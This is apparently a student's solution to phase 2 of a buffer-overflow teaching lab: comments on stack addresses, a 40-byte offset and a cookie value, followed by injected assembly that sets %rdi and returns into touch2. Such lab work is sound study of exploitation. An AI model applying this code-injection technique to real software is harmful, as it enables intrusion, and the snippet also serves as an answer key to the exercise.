/* Detailed instruction:
 * to get the exact adress of the register, we have to run the code and set a break point at the place you want
 * We get the adress of %rsp when running getbuf() 0x5561dc78, and 0x5561dc98 (after 40 bytes) it's the original return adress 401976.
 * then push touch2 at the %rsp so that it will be called later.
 * the input string goes into %rdi in getbuf(), and my cookie is 0x59b997fa
 * 
*/
movq    $0x59b997fa, %rdi
pushq   $0x4017ec
ret
